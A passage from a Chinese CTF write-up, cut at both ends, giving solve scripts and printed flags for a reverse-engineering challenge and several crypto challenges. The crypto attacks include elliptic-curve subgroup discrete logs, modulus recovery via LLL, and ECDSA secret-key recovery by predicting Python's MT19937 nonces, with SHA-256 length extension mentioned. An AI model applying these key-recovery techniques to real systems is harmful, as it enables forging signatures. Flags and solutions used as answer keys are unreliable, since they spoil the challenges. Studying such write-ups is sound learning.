return v5 != 0x6E67314E33655231LL;
return __ROR8__(v5, 16) != 0x66614E675F393036LL;
return v5 != 0x6339313935303439LL;
return _byteswap_uint64(v5) >> 8 != 0xA7D3839663534LL;
```

其中 `ROR8` 與 `byteswap` 需要特別處理, 其他的就是大端序直接轉 ASCII 即可
略寫個轉換程式碼如下

```py
import struct

def ror(val, r_bits):
    return ((val & 0xFFFFFFFFFFFFFFFF) >> r_bits) | ((val << (64 - r_bits)) & 0xFFFFFFFFFFFFFFFF)

data = [
    (0x74686520666C6167, "normal"),
    (0x20666F7220746869, "normal"),
    (0x73206368616C6C65, "normal"),
    (0x6E67652069733A20, "normal"),
    (0x545275454F467B35, "ror24"), # __ROR8__(v5, 24)
    (0x4354755233445F72, "normal"),
    (0x3356335235335F33, "normal"),
    (0x6E67314E33655231, "normal"),
    (0x66614E675F393036, "ror16"), # __ROR8__(v5, 16)
    (0x6339313935303439, "normal"),
    (0xA7D3839663534,    "byteswap") # byteswap >> 8
]

flag = ""

for val, mode in data:
    if mode == "normal":
        flag += struct.pack('>Q', val).decode()
    elif mode == "ror24":
        actual_v5 = ror(val, 64-24)
        flag += struct.pack('>Q', actual_v5).decode()
    elif mode == "ror16":
        actual_v5 = ror(val, 64-16)
        flag += struct.pack('>Q', actual_v5).decode()
    elif mode == "byteswap":
        temp = struct.pack('>Q', val << 8)[:7]
        flag += temp[::-1].decode()

print(flag)
```

輸出為
`the flag for this challenge is: EOF{5TRuCTuR3D_r3V3R53_3ng1N3eR1Ng_906fac919504945f98}`

所以 flag 就是
> EOF{5TRuCTuR3D_r3V3R53_3ng1N3eR1Ng_906fac919504945f98}

---

### Structured - Large
> Solver : 此情吳計可消除

![image](https://hackmd.io/_uploads/r11R_007be.png)
![image](https://hackmd.io/_uploads/SyKkFRC7Wl.png)
就出來惹

---

## Crypto
### catcat's message
> Solver : 此情吳計可消除

題目給定prime field：
$$
E/\mathbb{F}_p:\quad y^2 = x^3 + 1 \pmod p
$$

輸出只有 \(x\)，但曲線方程讓我們可得：

$$
y^2 \equiv x^3+1 \pmod p
\Rightarrow
y \equiv \sqrt{x^3+1} \pmod p
$$

所以同一個 x 對應兩個點 \((x,y)\) 與 \((x,-y)\)。

```python
import sympy as sp

def lift_point_from_x(x, p):
    rhs = (pow(x, 3, p) + 1) % p
    y = sp.sqrt_mod(rhs, p, all_roots=False)  # 取任一平方根
    if y is None:
        raise ValueError("x not on curve")
    return (x % p, int(y))  # 另一個點是 (x, -y mod p)
```
---

用 CM 計算 $(\#E(\mathbb{F}_p))$

對 $(y^2=x^3+1$)（$(j=0$)）的曲線，可用（CM找到：

$$
p = a^2 + 3b^2
$$

並得到 $(t = pm 2a)$，so：

$$
\#E(\mathbb{F}_p) = p + 1 - t
$$

直接試哪個 n 讓 $(nP=\mathcal{O})$ 就好惹。

```python
import sympy as sp
import math

def cornacchia_prime(D, p):
    # 找 x^2 + D y^2 = p 的 (x,y)
    r = sp.sqrt_mod((-D) % p, p, all_roots=False)
    a, b = p, int(r)
    while b*b > p:
        a, b = b, a % b
    x = b
    y2 = (p - x*x) // D
    y = math.isqrt(y2)
    return x, y

# p = a^2 + 3 b^2
a_cm, b_cm = cornacchia_prime(3, p)

n1 = p + 1 - 2*a_cm
n2 = p + 1 + 2*a_cm
```

若已知 $(n=\#E(\mathbb{F}_p))$，
接著把 $(ord(P)\) 分解出 \(2^{46})$：

$$
ord(P)=2^{46}\cdot \text{(odd part)}
$$

定義

$$
H=\frac{ord(P)}{2^{46}}
$$

那麼對任何點 \(R\)

$$
R_2 = H\cdot R
$$

會落在 $(2^{46})$ 的子群中。

```python
def ec_add(Pt, Qt, p):
    if Pt is None: return Qt
    if Qt is None: return Pt
    x1,y1 = Pt; x2,y2 = Qt
    if x1 == x2:
        if (y1 + y2) % p == 0:
            return None
        lam = (3*x1*x1) * pow(2*y1, -1, p) % p
    else:
        lam = (y2 - y1) * pow((x2 - x1) % p, -1, p) % p
    x3 = (lam*lam - x1 - x2) % p
    y3 = (lam*(x1 - x3) - y1) % p
    return (x3,y3)

def ec_mul(k, Pt, p):
    R = None
    Q = Pt
    while k:
        if k & 1:
            R = ec_add(R, Q, p)
        Q = ec_add(Q, Q, p)
        k >>= 1
    return R

def point_order(Pt, n, factor_dict, p):
    # n 已分解成 factor_dict={q:e}
    ord_ = n
    for q,e in factor_dict.items():
        for _ in range(e):
            cand = ord_ // q
            if ec_mul(cand, Pt, p) is None:
                ord_ = cand
            else:
                break
    return ord_

import sympy as sp
fac = sp.factorint(n, limit=10**6)
orderP = point_order(P, n, fac, p)

m = 46
ord2 = 2**m
H = orderP // ord2

P2 = ec_mul(H, P, p)
Q2 = ec_mul(H, Q, p)
```

---

投影後，所有輸出點 $(R_2)$ 都在同一個 2 次冪群裡，並且可表示為：

$$
R_2 = c\cdot P_2 + d\cdot Q_2 \quad (\bmod\ 2^{46})
$$

我們要從 $(R_2)$ 反推出 $((c,d)\)（mod \(2^{46})）$

逐個擊破

在 $(2^m)$ 中，用 \(2\)-torsion 可抽出每個 bit：



$$
A = 2^{m-1}P_2,\quad B = 2^{m-1}Q_2
$$

則 \(A,B\) 都是 order 2 的點，且集合：

$$
\{\mathcal{O}, A, B, A+B\}
$$

恰對應 $((c_i,d_i)\in\{0,1\}^2)$ 的四種情況。

對第 `i` 個 bit，我們看：

$$
S_i
=2^{m-1-i}\cdot\left(R_2 - \sum_{j<i}(c_j2^jP_2+d_j2^jQ_2)\right)
\in\{\mathcal{O},A,B,A+B\}
$$

由 $(S_i)$ 落在哪個點，就能決定 $((c_i,d_i))$。

```python
P_pows = [P2]
Q_pows = [Q2]
for _ in range(1, m):
    P_pows.append(ec_add(P_pows[-1], P_pows[-1], p))  # *2
    Q_pows.append(ec_add(Q_pows[-1], Q_pows[-1], p))  # *2

A = P_pows[m-1]
B = Q_pows[m-1]
C = ec_add(A, B, p)

def dlog_2power_basis(T):
    # (c,d) mod 2^m , T = cP2 + dQ2
    c = d = 0
    S = None 
    for i in range(m):
        # R = T - S
        if S is None:
            R = T
        else:
            R = ec_add(T, (S[0], (-S[1])%p), p)

        # Sbit = 2^(m-1-i) * R
        Sbit = R
        for _ in range(m-1-i):
            Sbit = ec_add(Sbit, Sbit, p)

        if Sbit is None:
            ci, di = 0, 0
        elif Sbit == A:
            ci, di = 1, 0
        elif Sbit == B:
            ci, di = 0, 1
        elif Sbit == C:
            ci, di = 1, 1

        if ci:
            c |= (1<<i)
            S = ec_add(S, P_pows[i], p)
        if di:
            d |= (1<<i)
            S = ec_add(S, Q_pows[i], p)
    return c, d
```

輸出只有 x，所以 lift 出來的點可能是 $(R)$ 或 $(-R)$  
投影後也會變成：

$$
H\cdot(-R)=-(H\cdot R)
\Rightarrow
(c,d)\mapsto(-c,-d)\ (\bmod 2^{46})
$$

因此你對每個 x 算出一組 $(c,d)$ 後，要同時考慮：

$$
(c,d)\ \text{或}\ (-c\bmod 2^{46}, -d\bmod 2^{46})
$$

```python
M = 2**46

def coeffs_from_x(x):
    R = lift_point_from_x(x, p)
    R2 = ec_mul(H, R, p)
    c, d = dlog_2power_basis(R2)
    return (c % M, d % M), ((-c) % M, (-d) % M)
```

---

`chal.py`有兩個多項式

$$
P(m)=\sum_{k=0}^{7} a_k m^k,\quad
Q(m)=\sum_{k=0}^{7} b_k m^k
\quad (\bmod 2^{46})
$$

```python
def poly_eval(coeffs, x, mod):
    r = 0
    for c in reversed(coeffs):
        r = (r * x + c) % mod
    return r
```

每個 bit 會產生兩個輸出點 $(R_1, R_2)$，其在 $(2^{46}$) 

- **bit = 1**：會看到某兩個位置等於 $(P(m)$) 與 $(Q(m)$)（模 $(2^{46}$)）
- **bit = 0**：那兩個位置被隨機 $(u$)，幾乎不可能同時對上同一個 \(m\)

所以對每個 bit，
$$
\exists m\in\mathbb{Z}/2^{46}\mathbb{Z}
\quad\text{s.t.}\quad
P(m)\equiv c^\star,\ \ Q(m)\equiv d^\star \pmod{2^{46}}
$$
直接在 \(2^{46}\) 全搜不可能，所以逐步 lift：


```python
def has_solution_for_targets(ct, dt, coeffP, coeffQ, start_bits=12, m_bits=46):
    mod0 = 2**start_bits
    ct0, dt0 = ct % mod0, dt % mod0

    sols = []
    for x in range(mod0):
        if poly_eval(coeffP, x, mod0) == ct0 and poly_eval(coeffQ, x, mod0) == dt0:
            sols.append(x)
    if not sols:
        return False

    cur_bits = start_bits
    while cur_bits < m_bits:
        next_bits = cur_bits + 1
        modn = 2**next_bits
        ctn, dtn = ct % modn, dt % modn
        step = 2**cur_bits

        new = []
        for x in sols:
            if poly_eval(coeffP, x, modn) == ctn and poly_eval(coeffQ, x, modn) == dtn:
                new.append(x)
            x1 = x + step
            if poly_eval(coeffP, x1, modn) == ctn and poly_eval(coeffQ, x1, modn) == dtn:
                new.append(x1)

        if not new:
            return False
        sols = list(set([v % modn for v in new]))
        cur_bits = next_bits

    return True
```

> solve,py
```py
import sympy as sp
import math
from pathlib import Path

p = 258664426012969094010652733694893533536393512754914660539884262666720468348340822774968888139573360124440321458177

P = (
    211327896882745355133216154117765694506824267591963425810864360539127436927129408124317179524815263831669171942288,
    242000360178127454722920758782320325120065800315232786687003874687882586608857040803085327019415054542726981896082
)
Q = (
    141078002483297354166779897252895086829637396399741587968861330915310465563157775245215359678414439802307293763593,
    21987419692484616093788518727313616089990324856173653004512069981050648496581282307403640131128425072464960150591
)


coeffP = [
    220273362144208970479265455330337458917043647417072292667607653673224970006747007341371609183229917395181118430820,
    250210421739490121280267358806528070202074006488405548116408889541562281570437524908655234300295156558260644714790,
    232701688844828316746402724793237178717464441244532163700038748140038967163962591066546062836475323177856883965170,
    21725422740459928990591308588258432180565692590248212021408656855315251472837770646928856382097832397887844336884,
    31838373662325139580926902452637696183043785768442789736602748197181912878103291332207751350605297251672800447952,
    91064528951076613265720743351539296774527279629238715675150132217418711139411039580553128030185345691325519935046,
    84164703558004000847171599254942386241373795544353150531373272670049397760530800008840197737820366466346314691162,
    3471086628063885446357238753610323531339793559544546903532909144431975428449306236097334672163550644000
]
coeffQ = [
    143491234406688723416490898601225309678343916741387556923054435686233973323559376474177051270543031936592520011397,
    233302413192532175819496609029797143533434993955387323269458143291245908014630929176027926621738749425901291228018,
    180776214508546762217902706989924469079606298223767170020347719086675964795206127649700412230279249284690008979158,
    65176268221379786971773925764775296541697077770744636064225970565945754418513311940786569146293497193663533010652,
    95515120986975418742780707357913088549131357305328369209808244591545738634309873996623254051815891755018401343856,
    14529160840260745786509496359724356787188326132801486485566133985535665069892295966690495950982676949536238346962,
    252494110674012002541514797764827158724121386633059451594119818010148193281592400026520593213461099399038944073486,
    10413259884191656339071716260830970594019380678633640710598727433295926285347918708292004016490651932000
]

def poly_eval(coeffs, x, mod):
    res = 0
    for c in reversed(coeffs):
        res = (res * x + c) % mod
    return res

def ec_neg(Pt):
    if Pt is None: return None
    x,y = Pt
    return (x, (-y) % p)

def ec_add(Pt, Qt):
    if Pt is None: return Qt
    if Qt is None: return Pt
    x1,y1 = Pt
    x2,y2 = Qt
    if x1 == x2:
        if (y1 + y2) % p == 0:
            return None
        # double
        lam = (3*x1*x1) * pow(2*y1, -1, p) % p
    else:
        lam = (y2 - y1) * pow((x2 - x1) % p, -1, p) % p
    x3 = (lam*lam - x1 - x2) % p
    y3 = (lam*(x1 - x3) - y1) % p
    return (x3,y3)

def ec_sub(Pt, Qt):
    return ec_add(Pt, ec_neg(Qt))

def jacobian_from_affine(Pt):
    if Pt is None:
        return (1,1,0)
    x,y = Pt
    return (x%p, y%p, 1)

def jacobian_neg(Pt):
    X,Y,Z = Pt
    if Z == 0: return Pt
    return (X, (-Y) % p, Z)

def jacobian_double(Pt):
    X1,Y1,Z1 = Pt
    if Z1 == 0 or Y1 == 0:
        return (1,1,0)
    A = (X1*X1) % p
    B = (Y1*Y1) % p
    C = (B*B) % p
    D = (2 * ((X1 + B)**2 - A - C)) % p
    E = (3 * A) % p
    F = (E*E) % p
    X3 = (F - 2*D) % p
    Y3 = (E*(D - X3) - 8*C) % p
    Z3 = (2*Y1*Z1) % p
    return (X3, Y3, Z3)

def jacobian_add(Pt, Qt):
    X1,Y1,Z1 = Pt
    X2,Y2,Z2 = Qt
    if Z1 == 0: return Qt
    if Z2 == 0: return Pt

    Z1Z1 = (Z1*Z1) % p
    Z2Z2 = (Z2*Z2) % p
    U1 = (X1*Z2Z2) % p
    U2 = (X2*Z1Z1) % p
    S1 = (Y1 * Z2 * Z2Z2) % p
    S2 = (Y2 * Z1 * Z1Z1) % p
    H = (U2 - U1) % p
    R = (S2 - S1) % p
    if H == 0:
        if R == 0:
            return jacobian_double(Pt)
        return (1,1,0)

    HH = (H*H) % p
    HHH = (H*HH) % p
    U1HH = (U1*HH) % p
    X3 = (R*R - HHH - 2*U1HH) % p
    Y3 = (R*(U1HH - X3) - S1*HHH) % p
    Z3 = (H*Z1*Z2) % p
    return (X3, Y3, Z3)

def jacobian_eq(Pt, Qt):
    X1,Y1,Z1 = Pt
    X2,Y2,Z2 = Qt
    if Z1 == 0 and Z2 == 0:
        return True
    if Z1 == 0 or Z2 == 0:
        return False
    Z1Z1 = (Z1*Z1) % p
    Z2Z2 = (Z2*Z2) % p
    U1 = (X1*Z2Z2) % p
    U2 = (X2*Z1Z1) % p
    if U1 != U2:
        return False
    S1 = (Y1 * Z2 * Z2Z2) % p
    S2 = (Y2 * Z1 * Z1Z1) % p
    return S1 == S2

def jacobian_mul(k, P_aff):
    if k == 0 or P_aff is None:
        return (1,1,0)
    Q = jacobian_from_affine(P_aff)
    R = (1,1,0)
    while k:
        if k & 1:
            R = jacobian_add(R, Q)
        Q = jacobian_double(Q)
        k >>= 1
    return R

def cornacchia_prime(D, p_):
    r = sp.sqrt_mod((-D) % p_, p_, all_roots=False)
    a_, b_ = p_, int(r)
    while b_*b_ > p_:
        a_, b_ = b_, a_ % b_
    x = b_
    y2 = (p_ - x*x) // D
    y = math.isqrt(y2)
    if y*y == y2:
        return x, y

a_cm, b_cm = cornacchia_prime(3, p)
n = p + 1 - 2*a_cm

fac = sp.factorint(n, limit=10**6)

def ec_mul_aff(k, Pt):
    R = None
    Q = Pt
    while k:
        if k & 1:
            R = ec_add(R, Q)
        Q = ec_add(Q, Q)
        k >>= 1
    return R

def point_order(Pt, n_, factors):
    ord_ = n_
    for q,e in factors.items():
        for _ in range(e):
            cand = ord_ // q
            if ec_mul_aff(cand, Pt) is None:
                ord_ = cand
            else:
                break
    return ord_

orderP = point_order(P, n, fac)
ord2 = 2**46
H = orderP // ord2

P2j = jacobian_mul(H, P)
Q2j = jacobian_mul(H, Q)

m = 46
P_pows = [P2j]
Q_pows = [Q2j]
for _ in range(1, m):
    P_pows.append(jacobian_double(P_pows[-1]))
    Q_pows.append(jacobian_double(Q_pows[-1]))

A_j = P_pows[m-1]           # 2^45 P2
B_j = Q_pows[m-1]           # 2^45 Q2
C_j = jacobian_add(A_j,B_j)
O_j = (1,1,0)

def dlog_2power_basis_jac(Tj):
    a=b=0
    Sj = O_j
    for i in range(m):
        Rj = jacobian_add(Tj, jacobian_neg(Sj))
        Sbit = Rj
        for _ in range(m-1-i):
            Sbit = jacobian_double(Sbit)

        if jacobian_eq(Sbit, O_j):
            da=db=0
        elif jacobian_eq(Sbit, A_j):
            da,db=1,0
        elif jacobian_eq(Sbit, B_j):
            da,db=0,1
        elif jacobian_eq(Sbit, C_j):
            da,db=1,1

        if da:
            a |= (1<<i)
            Sj = jacobian_add(Sj, P_pows[i])
        if db:
            b |= (1<<i)
            Sj = jacobian_add(Sj, Q_pows[i])
    return a,b

def lift_point_from_x(x):
    rhs = (pow(x,3,p) + 1) % p
    y = sp.sqrt_mod(rhs, p, all_roots=False)
    return (x % p, int(y))

def coeffs_from_x(x):
    R_aff = lift_point_from_x(x)
    Tj = jacobian_mul(H, R_aff)
    return dlog_2power_basis_jac(Tj)

def has_solution_for_targets(ct, dt, start_bits=12, m_bits=46):
    mod0 = 2**start_bits
    ct0 = ct % mod0
    dt0 = dt % mod0
    sols = []
    for x in range(mod0):
        if poly_eval(coeffP, x, mod0)==ct0 and poly_eval(coeffQ, x, mod0)==dt0:
            sols.append(x)
    if not sols:
        return False

    cur_bits = start_bits
    while cur_bits < m_bits:
        next_bits = cur_bits + 1
        modn = 2**next_bits
        ctn = ct % modn
        dtn = dt % modn
        step = 2**cur_bits
        new = []
        for x in sols:
            if poly_eval(coeffP, x, modn)==ctn and poly_eval(coeffQ, x, modn)==dtn:
                new.append(x)
            x1 = x + step
            if poly_eval(coeffP, x1, modn)==ctn and poly_eval(coeffQ, x1, modn)==dtn:
                new.append(x1)
        if not new:
            return False
        sols = list(set([v % modn for v in new]))
        cur_bits = next_bits
    return True

lines = Path("output.txt").read_text().splitlines()
hex_lines = [l.strip() for l in lines if l.strip().startswith("0x")]
xs = [int(h,16) for h in hex_lines]
assert len(xs) % 2 == 0
M = 2**46

coeffs = [coeffs_from_x(x) for x in xs]

bits = []
for i in range(len(coeffs)//2):
    c1,d1 = coeffs[2*i]
    c2,d2 = coeffs[2*i+1]

    ok = False
    for d_candidate in [d1 % M, (-d1) % M]:
        for c_candidate in [c2 % M, (-c2) % M]:
            if has_solution_for_targets(c_candidate, d_candidate):
                ok = True
                break
        if ok:
            break
    bits.append(1 if ok else 0)

out = []
for i in range(0, len(bits), 8):
    v = 0
    for j in range(8):
        v = (v<<1) | bits[i+j]
    out.append(v)

flag = bytes(out).decode("utf-8")
print(flag)
```
```
[13:37:59] ~/Downloads/dist-cat-msg-e482eab1511b4889458608cd55a10d0276fade1c ➜ /usr/local/bin/python3 /Users/yih_0118/Downloads/dist-cat-msg-e482eab1511b4889458608cd55a10d0276fade1
c/solve.py
EOF{cats_dont_like_you_for_breaking_their_meowderful_scheme_...🐈⚔🐈}
```

---

### 65537

> Solver : 此情吳計可消除

對於一個 $d=36$ 次多項式 $f(x)$
```python
# M[j][i] = i^j，尋找 u 使得 M * u = 0
M = Matrix(ZZ, DEGREE + 1, N_POINTS)
for j in range(DEGREE + 1):
    for i in range(N_POINTS):
        M[j, i] = i**j

K = M.right_kernel()
basis = K.basis_matrix()

# 2.  LLL
basis_reduced = basis.LLL()

# 3. 計算 n 
diff = | prod(pos) - prod(neg) |
n = GCD(diff1, diff2)
```
可以用巴貝奇定理或是 整數域分段 gcd + lll 還原 $n$
解題時用的是後面的, 程式碼大概如此
```py
def solve_with_res_minus_one():
    N_big = n_clean 
    # LLL 結果矩陣需要轉換成行向量列表
    rows = short_vectors.rows()
    
    print(f"[*] 分析 {len(rows)} 個 LLL 短向量...")
    
    current_best_n = N_big
    
    for idx, v in enumerate(rows):
        pos, neg = 1, 1
        
        # 在模 N_big 下計算，這能確保數值不爆炸
        # 同時 (pos - neg) % n 依然會是 0
        for i, p in enumerate(v):
            if p > 0:
                pos = (pos * pow(int(cs[i]), int(p), N_big)) % N_big
            elif p < 0:
                neg = (neg * pow(int(cs[i]), int(-p), N_big)) % N_big
        
        # 理論：pos \equiv neg (mod n)
        # 因此 (pos - neg) % N_big 必然含有 n 這個因子
        diff = (pos - neg) % N_big
        
        if diff == 0:
            continue
        
        # 進行 GCD 縮減
        new_n = gcd(current_best_n, diff)
        
        # 移除常見小因子
        for p in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]:
            while new_n > 1 and new_n % p == 0:
                new_n //= p
        
        if new_n == 1:
            # 如果縮減到 1，代表這組向量不具備公因數資訊，保持原狀
            continue
            
        current_best_n = new_n
        print(f"[向量 {idx:2d}] 當前縮減長度: {current_best_n.bit_length()} bits")
        
        # 判定是否達到目標
        if 1300 <= current_best_n.bit_length() <= 1320:
            print("-" * 40)
            print(f"[!] 成功鎖定真正的 n: {current_best_n}")
            return current_best_n
            
    return current_best_n

# 執行
final_real_n = solve_with_res_minus_one()
```
輸出:
```txt
[*] 正在分析 50 個 LLL 短向量...

[向量  3] 當前縮減長度: 1779 bits

[向量  5] 當前縮減長度: 1779 bits

[向量  6] 當前縮減長度: 1779 bits

[向量  7] 當前縮減長度: 1779 bits

[向量  8] 當前縮減長度: 1779 bits

[向量  9] 當前縮減長度: 1309 bits

----------------------------------------

[!] 成功鎖定真正的 n: 10850218348849388184435839628926643887136150328576801864491695172926404197571570385939626289500386832511402210498393679618152065868746502857101558394210162242772577854755935729867785192549043290755536804070935808559487602145906062653872704574131013288989225871928399716107298421266694464764949626094347467338293230326188948478771610969844826976259603642310765553072611629632109802126514549219571
```

有了 $n$，目標是找到一組重 $w$，使得 $x_i$ 的冪次組合後，只保留第 $k$ 項係數 $a_k$：
$$\sum_{i} w_i \cdot f(x_i) = C \cdot a_k$$

由於係數 $a_k$ 很小 ($< 65537$)，可以用 MITM 攻擊來確定係數的比例關係。對於基準項 $M_0$ 和目標項 $M_k$：

$$M_k \equiv \prod c_i^{w_i} \equiv m^{C \cdot a_k} \pmod n$$

求出所有 $a_k$ 相對於 $a_0$ 的比例後，利用分母的最小公倍數 (LCM) 還原整數係數。

```python
# V 是范德蒙矩陣
VT = V.transpose()
target = vector(QQ, [0]*DEGREE + [0])
target[k] = 1
w_rat = VT.solve_right(target) # w * V = e_k

# M_k ~ m^(C * a_k) mod n

# 尋找 x, y 使得 M0^x = Mk^y
lookup = {}
for i in range(1, LIMIT):
    lookup[pow(M0, i, n)] = i # 存表

for j in range(1, LIMIT):
    val = pow(Mk, j, n)
    if val in lookup:
        x = lookup[val]
        y = j
        # 發現關係: a0 * x = ak * y
        # ak = a0 * (x/y)
        break
```

一旦完全恢復了多項式 $f(x)$，我們可以計算每個 $x_i$ 對應的指數 $e_i = f(x_i)$。

計算所有指數的最大公因數：$$g = \text{GCD}(e_0, e_1, \dots, e_{86})$$根據 貝祖定理，存在整數 $v_i$ 使得：$$\sum v_i e_i = g$$

利用擴展歐幾里得算法求出 $v_i$，然後組合密文：

$$\prod c_i^{v_i} \equiv m^{\sum v_i e_i} \equiv m^g \pmod n$$

通常情況下 $g=1$，直接得到 $m$。如果 $g>1$，則需要開 $g$ 次方根。

```python
exponents = []
for i in range(N_POINTS):
    val = 0
    for c in reversed(coeffs):
        val = val * xs[i] + c
    exponents.append(val)

# 求解貝祖係數 v_i
# sum(v_i * e_i) = g
coeffs_m = [0] * N_POINTS
curr_g = exponents[0]
coeffs_m[0] = 1

for i in range(1, N_POINTS):
    new_g, a, b = xgcd(curr_g, exponents[i])
    for j in range(i): coeffs_m[j] *= a
    coeffs_m[i] = b
    curr_g = new_g

# 恢復明文 m
m = 1
for i in range(N_POINTS):
    term = pow(cs[i], abs(coeffs_m[i]), n)
    if coeffs_m[i] > 0:
        m = (m * term) % n
    else:
        m = (m * inverse_mod(term, n)) % n
```

---

> solve.py

```python
import sys
from sage.all import *

sys.set_int_max_str_digits(1000000000)

def get_data():
    with open('output.txt', 'r') as f:
        content = f.read().strip()
        content = content.replace('\n', '').replace(' ', '')
        if '[' in content:
            start = content.find('[')
            end = content.rfind(']') + 1
            content = content[start:end]
        cs_str = content[1:-1].split(',')
        cs = [Integer(x) for x in cs_str if x]
        return cs

def solve():
    cs = get_data()
    N_POINTS = len(cs)
    DEGREE = 36

    n_str = "10850218348849388184435839628926643887136150328576801864491695172926404197571570385939626289500386832511402210498393679618152065868746502857101558394210162242772577854755935729867785192549043290755536804070935808559487602145906062653872704574131013288989225871928399716107298421266694464764949626094347467338293230326188948478771610969844826976259603642310765553072611629632109802126514549219571"
    n = Integer(n_str)
    print(f"n: {n.nbits()} bits")
    
    BASE_X = 65537
    xs = [BASE_X + i for i in range(N_POINTS)]
    
    V = Matrix(QQ, N_POINTS, DEGREE + 1)
    for i in range(N_POINTS):
        for j in range(DEGREE + 1):
            V[i, j] = xs[i] ** j
    VT = V.transpose()

    def get_isolated_base(idx):
        target = vector(QQ, [0]*DEGREE + [0])
        target[idx] = 1
        try:
            w_rat = VT.solve_right(target)
            denom = LCM([x.denominator() for x in w_rat])
            w = [Integer(x * denom) for x in w_rat]
            
            res = 1
            for i, exp in enumerate(w):
                if exp == 0: continue
                term = pow(cs[i], abs(exp), n)
                if exp > 0: res = (res * term) % n
                else: res = (res * inverse_mod(term, n)) % n
            return res, denom
        except: return None, None

    M0_raw, C0 = get_isolated_base(0)

    ratios = {0: (1, 1)} 
    for k in range(1, DEGREE + 1):
        Mk_raw, Ck = get_isolated_base(k)

        C_new = LCM(C0, Ck)
        
        M0_adj = pow(M0_raw, C_new // C0, n)
        Mk_adj = pow(Mk_raw, C_new // Ck, n)
        
        lookup = {}
        curr = 1
        limit = 70000
        for i in range(1, limit):
            curr = (curr * M0_adj) % n
            lookup[curr] = i
            
        curr_k = 1
        for j in range(1, limit):
            curr_k = (curr_k * Mk_adj) % n
            if curr_k in lookup:
                x = lookup[curr_k]
                y = j
                g = GCD(x, y)
                ratios[k] = (x // g, y // g)
                print(f"a{k} = a0 * ({ratios[k][0]}/{ratios[k][1]})")
                found_ratio = True
                break


    denoms = [r[1] for r in ratios.values()]
    lcm_denom = LCM(denoms)
    
    a0_final = lcm_denom
    coeffs = []
    for k in range(DEGREE + 1):
        num, den = ratios[k]
        val = a0_final * num // den
        coeffs.append(val)
        
    # print(f"{coeffs}")
    exponents = []
    for i in range(N_POINTS):
        val = 0
        x_val = xs[i]
        for c in reversed(coeffs):
            val = val * x_val + c
        exponents.append(val)
        
    g_exp = exponents[0]
    for e in exponents: g_exp = GCD(g_exp, e)
    
    print(f"{g_exp}")
    
    coeffs_m = [0] * N_POINTS
    coeffs_m[0] = 1
    curr_g = exponents[0]
    
    for i in range(1, N_POINTS):
        new_g, a, b = xgcd(curr_g, exponents[i])
        for j in range(i): coeffs_m[j] *= a
        coeffs_m[i] = b
        curr_g = new_g
        if curr_g == g_exp: break
        
    m = 1
    for i in range(N_POINTS):
        if coeffs_m[i] == 0: continue
        term = pow(cs[i], abs(coeffs_m[i]), n)
        if coeffs_m[i] > 0: m = (m * term) % n
        else: m = (m * inverse_mod(term, n)) % n
            
    if g_exp != 1:
        try:
            m = m.nth_root(g_exp)
        except:
            pass


    from Crypto.Util.number import long_to_bytes
    flag = long_to_bytes(int(m))
    print(f"\n{flag.decode()}")

if __name__ == "__main__":
    solve()
```

---

**Flag:** `EOF{https://www.youtube.com/watch?v=hyvPxeLx_Yg}`

---

### dogdog's Proof

> Solver : 此情吳計可消除

題目有三個功能：

- `wowoof`：吐出一個 ticket 數字
- `wowooF`：對給定訊息做 ECDSA-like 簽章，回傳 `(r,s)`（但禁止訊息含 `i_am_the_king_of_the_dog`）
- `wowoOf`：驗證你提供的 `(r,s,msg)`；若驗證通過且 `msg` 內含 `i_am_the_king_of_the_dog` 就給 flag


```python
from random import getrandbits
from hashlib import sha256
import os
from tinyec import registry
from secrets import randbelow

curve = registry.get_curve('secp256r1')
n = 115792089210356248762697446949407573529996955224135760342422259061068512044369
G = curve.g

secret = randbelow(n)
Q = secret * G
salt = os.urandom(64)

def sign(msg):
    z = int(sha256(salt + msg).hexdigest(), 16) % n
    k = getrandbits(255)
    R = k * G
    r = R.x
    s = (z + r * secret) * pow(k, -1, n) % n
    return r, s

def verify(msg, r, s):
    z = int(sha256(salt + msg).hexdigest(), 16) % n
    u1, u2 = z * pow(s, -1, n), r * pow(s, -1, n)
    R2 = u1 * G + u2 * Q
    return R2.x == r

# wowoof:
ticket = getrandbits(134) ^ getrandbits(134)
```

---

ECDSA nonce `k` 用了 `random.getrandbits(255)`
`random` 模組是 **MT19937**（可預測 PRNG）。  
只要能重建當前 MT state，就能預測之後所有 `getrandbits()`

`wowoof` 洩漏了 MT 輸出線性關係
票券：
$$
t = \text{getrandbits}(134)\ \oplus\ \text{getrandbits}(134)
$$

而 MT 的「twist + temper」是線性的，所以每一個輸出 bit 都是內部 state bits 的 XOR 組合

hash：
$$
z = \mathrm{SHA256}(salt \Vert msg)\bmod n
$$
未知 salt 乍看會擋住你計算 `z`，但：

只要能拿到 `secret`，就能從簽章反推某個 `msg` 的 `z`。  
對 `salt || msg` 這種 ，SHA256 可做 length extension attacks：  
已知 `H = SHA256(salt||msg)` 時，可在不知道 salt 的情況下算出 `SHA256(salt||msg||pad||append)`。

---

MT19937 state 有 624 個 32-bit word，共 19968 個未知 bit。

每個 ticket 提供 134 個 bit ：

$$
t_j = a_j \oplus b_j
$$

其中 `a_j` 是第一個 `getrandbits(134)` 的第 j 個 bit，`b_j` 是第二個的第 j 個 bit。


```python
def add_equation(basis: dict, mask: int, rhs: int) -> bool:
    rhs &= 1
    while mask:
        pvt = (mask & -mask).bit_length() - 1 
        if pvt not in basis:
            basis[pvt] = (mask, rhs)
            return True
        m2, r2 = basis[pvt]
        mask ^= m2
        rhs ^= r2
    return rhs == 0
```

把每個 state bit 視為一個變數，用一個大整數 `mask` 表示「哪些變數 XOR 在一起」。 
然後在 GF(2) 下 MT 的 `twist` 與 `temper`，就能把每次 `getrandbits(134)` 的輸出 bit 展成 mask。

```python
mt = [[1 << (wi*32 + b) for b in range(32)] for wi in range(624)]
```

$$
s \equiv (z + r\cdot x)\cdot k^{-1} \pmod n
$$
其中 \(x=\text{secret}\)。

等價改寫：

$$
s k \equiv z + r x \pmod n
$$

對「同一個 msg」簽兩次，`z` 相同：

$$
\begin{aligned}
s_1k_1 &\equiv z + r_1x \pmod n \\
s_2k_2 &\equiv z + r_2x \pmod n
\end{aligned}
$$

相減消掉 `z`：

$$
s_1k_1 - s_2k_2 \equiv (r_1 - r_2)\,x \pmod n
$$

所以：

$$
x \equiv (s_1k_1 - s_2k_2)\cdot (r_1-r_2)^{-1} \pmod n
$$

```python
r1n = r1 % n
r2n = r2 % n
secret = ((s1*k1 - s2*k2) % n) * pow((r1n - r2n) % n, -1, n) % n
```

---


已知 `secret` 後，可以從單次簽章反推 `z`：

$$
